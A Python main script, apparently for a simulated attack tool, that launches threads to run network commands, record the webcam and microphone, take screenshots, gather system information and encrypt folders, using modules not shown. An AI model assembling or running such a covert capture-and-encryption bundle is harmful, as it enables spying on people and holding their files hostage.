import threading
from Features.CmdPrompts.CmdPrompts import CmdPrompts
from Features.Recordings.Webcamera import Webcamera
from Features.Screenshots.Screenshot import Screenshot
from Features.Soundfile.Microphone import Microphone
from Features.SystemInformation.Sysinfo import SysInfo
from Util.FileEncryption import FileEncryption


class MainFileException(Exception):
    pass


def main():
    ascii_art = """
       _____ _____ _____     _____ _____ __  __ 
      / ____/ ____|  __ \   / ____|_   _|  \/  |
     | |   | |    | |__) | | (___   | | | \  / |
     | |   | |    |  ___/   \___ \  | | | |\/| |
     | |___| |____| |       ____) |_| |_| |  | |
      \_____\_____|_|      |_____/|_____|_|  |_|                                  
        """
    print(ascii_art)

    try:
        # Create instances of the classes
        cmd_prompts = CmdPrompts()
        web_camera = Webcamera()
        screenshot = Screenshot()
        microphone = Microphone()
        sys_info = SysInfo()
        file_encryptor = FileEncryption()

        # Create threads for each feature
        threads = [
            threading.Thread(target=cmd_prompts.ipconfig_all),
            threading.Thread(target=cmd_prompts.netstat_ano),
            threading.Thread(target=web_camera.record_screen),
            threading.Thread(target=screenshot.screenshot),
            threading.Thread(target=microphone.audio_recording),
            threading.Thread(target=sys_info.system_information),
            threading.Thread(target=file_encryptor.encrypt_folders)
        ]

        # Start the threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

    except Exception as error:
        raise MainFileException(f"Main failed to run") from error


if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")
